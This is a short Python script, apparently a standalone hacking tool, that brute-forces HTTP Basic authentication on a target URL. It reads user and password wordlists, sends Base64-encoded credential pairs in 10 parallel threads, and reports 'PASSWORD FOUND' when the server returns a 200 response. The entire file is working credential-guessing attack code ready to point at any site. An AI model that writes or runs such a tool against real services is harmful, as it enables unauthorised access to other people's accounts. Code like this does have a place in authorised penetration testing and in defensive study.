#!/usr/bin/env python3

__author__ = "Yasser Janah (th3x0ne)"

try:
	import sys
	import concurrent.futures
	from requests import get as GET
	from colorama import Fore
	from os.path import isfile
	from argparse import ArgumentParser
	from base64 import b64encode
except ImportError as err:
	exit(err)

def printer(_:str) -> None:
	sys.stdout.write(f'{Fore.BLUE}[*]{Fore.WHITE} trying with {Fore.YELLOW}{_} {Fore.WHITE}')
	sys.stdout.flush()

def encode_user_passwd(user:str, passwd:str) -> str:
	user_pass = f"{user}:{passwd.strip()}"
	base64_value = b64encode(user_pass.encode('utf-8')).decode('utf-8')
	return base64_value

def send_request(url:str, user:str, passwd:str):
	base64_value = encode_user_passwd(user, passwd)
	headers = {"Authorization": f"Basic {base64_value}"}
	try:
		response = GET(url, headers=headers)
		printer(f"{user}:{passwd}")
		if response.status_code == 200:
			exit(f"\n{Fore.GREEN}[+] {Fore.WHITE} PASSWORD FOUND : {Fore.GREEN}{user} : {passwd}{Fore.WHITE}.")
	except Exception as err:
		print(err)

if __name__ == "__main__":
	parser = ArgumentParser()
	parser.add_argument('-t', '--target', required=True, help="TARGET URL")
	parser.add_argument('-u', '--user-file', required=True, help="USERS FILE")
	parser.add_argument('-p', '--password-file', required=True, help="PASSWORDS FILE")
	args = parser.parse_args()
	users = open(args.user_file, mode='r').readlines()
	passwords = open(args.password_file, mode='r').readlines()
	for user in users:
		user = user.strip('\n\r')
		try:
			with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
				{ executor.submit(send_request, args.target, user, passwd) for passwd in passwords}
			# for passwd in passwords:
			# 	send_request(args.target, user, passwd.strip())
		except KeyboardInterrupt:
			exit('CTRL+C Detected...')

